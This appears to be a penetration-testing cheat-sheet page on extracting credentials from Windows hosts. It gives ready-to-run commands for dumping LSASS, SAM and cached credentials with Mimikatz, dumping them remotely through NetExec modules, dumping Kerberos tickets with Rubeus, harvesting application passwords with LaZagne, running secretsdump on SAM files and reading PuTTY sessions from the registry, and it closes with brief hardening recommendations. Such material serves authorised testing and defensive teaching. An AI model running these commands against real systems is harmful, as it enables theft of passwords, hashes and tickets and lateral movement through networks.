# Credentials Extraction
---

## Vulnerability

In modern versions of Windows, password hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space. An attacker who could access to these hashes could crack them to obtain the cleartext password or reuse them to lateralize his attack or to elevate his privileges.

## Prerequisites

- SYSTEM or local administrator rights on the target host.

## Exploit

### LSASS credentials

To dump LSASS credentials, use [Mimikatz](https://github.com/gentilkiwi/mimikatz).

```bash
# Start Mimikatz in a administrator PowerShell.
.\Mimikatz.exe

# Engage SeDebugPrivlege, to interact with a process owned by another account.
privilege::debug

# Elevate first.
token::elevate

# Dump passwords of all logged on users.
sekurlsa::logonpasswords

# Dump NTLM hashes from SAM.
lsadump::sam

# Dump Kerberos tickets stored in-memory.
sekurlsa::tickets

# Dump Kerberos encryption keys of logged on users.
sekurlsa::ekeys

# Dump Domain Cached Credentials from HKLM\SECURITY.
lsadump::cache
```

It’s also possible to do it remotely with [NetExec](https://github.com/Pennyw0rth/NetExec/).

```bash
nxc smb $target -u $username -p $password --lsa
nxc smb $target -u $username -p $password -M nanodump
nxc smb $target -u $username -p $password -M mimikatz
nxc smb $target -u $username -p $password -M lsassy
```

### Kerberos tickets

If you prefer focusing on Kerberos tickets, [Rubeus](https://github.com/GhostPack/Rubeus) is your friend.

```powershell
# List all Kerberos tickets in the current session (all sessions if elevated).
.\Rubeus.exe triage

# Dump Kerberos tickets used for a service for a Locally Unique Identifier.
.\Rubeus.exe dump /luid:$luid /service:$service /nowrap
```

### Applications

You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from many Windows applications like browsers or WiFi.

```bash
laZagne.exe all
```

### SAM database

You can use `SAM` and `SYSTEM` files from your target to extract user hashes. These files are by default located at following **protected** paths:
* C:\Windows\System32\Config\SAM.
* C:\Windows\System32\Config\SYSTEM.

If you manage to retrieve these two files on your Kali, extract hashes like this.

```bash
impacket-secretsdump LOCAL -sam SAM -system SYSTEM
```

### Putty

If [PuTTY is installed](/windows/enumeration/#installed-softwares) on the target host, you can extract cached credentials by querying following registry key.

```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

## Recommendations

- [ ] Enforce EDR on Windows hosts to prevent the usage of malwares to extract credentials.
- [ ] Enable additional LSA Protection. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.